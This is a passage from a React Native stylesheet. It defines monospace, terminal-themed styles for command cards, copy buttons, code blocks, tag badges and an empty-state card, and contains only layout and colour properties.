    fontSize: 12,
    fontWeight: '700',
    color: THEME.accent,
    letterSpacing: 1.1,
  },
  sectionTip: {
    fontFamily: 'monospace',
    fontSize: 9,
    color: THEME.textMuted,
  },
  commandCard: {
    backgroundColor: THEME.card,
    borderWidth: 1,
    borderColor: '#333',
    borderRadius: 8,
    padding: 14,
    marginBottom: 14,
  },
  cardHeader: {
    flexDirection: 'row',
    justifyContent: 'space-between',
    alignItems: 'center',
    marginBottom: 8,
  },
  titleRow: {
    flex: 1,
    flexDirection: 'row',
    alignItems: 'center',
    marginRight: 8,
  },
  indexNum: {
    fontFamily: 'monospace',
    fontSize: 11,
    color: THEME.accent,
    fontWeight: 'bold',
    marginRight: 6,
  },
  cardTitle: {
    flex: 1,
    fontFamily: 'monospace',
    fontSize: 13,
    fontWeight: '700',
    color: THEME.text,
  },
  copyButton: {
    paddingHorizontal: 10,
    paddingVertical: 5,
    borderRadius: 4,
    borderWidth: 1,
    borderColor: THEME.accent,
    backgroundColor: 'rgba(0, 212, 255, 0.1)',
  },
  copyButtonSuccess: {
    borderColor: THEME.primary,
    backgroundColor: 'rgba(0, 255, 102, 0.2)',
  },
  copyButtonText: {
    fontFamily: 'monospace',
    fontSize: 10,
    fontWeight: 'bold',
    color: THEME.accent,
  },
  copyButtonTextSuccess: {
    color: THEME.primary,
  },
  cardDescription: {
    fontFamily: 'monospace',
    fontSize: 11,
    color: THEME.text,
    lineHeight: 16,
    marginBottom: 10,
  },
  codeBlock: {
    backgroundColor: '#050c17',
    borderWidth: 1,
    borderColor: '#1d3450',
    borderRadius: 6,
    padding: 10,
    marginBottom: 10,
  },
  codeBlockCopied: {
    borderColor: THEME.primary,
    backgroundColor: 'rgba(0, 255, 102, 0.05)',
  },
  codeBlockHeader: {
    flexDirection: 'row',
    justifyContent: 'space-between',
    alignItems: 'center',
    marginBottom: 6,
    borderBottomWidth: 1,
    borderBottomColor: '#102235',
    paddingBottom: 4,
  },
  codePromptSymbol: {
    fontFamily: 'monospace',
    fontSize: 11,
    color: THEME.accent,
    fontWeight: 'bold',
  },
  codeLangTag: {
    fontFamily: 'monospace',
    fontSize: 9,
    color: THEME.textMuted,
    fontWeight: '700',
  },
  codeText: {
    fontFamily: 'monospace',
    fontSize: 12,
    color: THEME.primary,
    lineHeight: 18,
  },
  codeTextCopied: {
    color: '#33ff88',
  },
  tagsRow: {
    flexDirection: 'row',
    flexWrap: 'wrap',
    gap: 6,
  },
  tagBadge: {
    backgroundColor: 'rgba(139, 168, 204, 0.1)',
    borderRadius: 3,
    paddingHorizontal: 6,
    paddingVertical: 2,
  },
  tagText: {
    fontFamily: 'monospace',
    fontSize: 9,
    color: THEME.textMuted,
  },
  emptyCard: {
    backgroundColor: THEME.card,
    borderWidth: 1,
    borderColor: '#333',
    borderRadius: 8,
    padding: 24,
    alignItems: 'center',
    marginVertical: 20,
  },
  emptyTitle: {
    fontFamily: 'monospace',
    fontSize: 14,
    fontWeight: 'bold',
    color: THEME.error,
    marginBottom: 6,
  },
  emptySubtitle: {
    fontFamily: 'monospace',
    fontSize: 11,
    color: THEME.textMuted,
    textAlign: 'center',
  },
  bottomSpacer: {
    height: 40,
  },
});
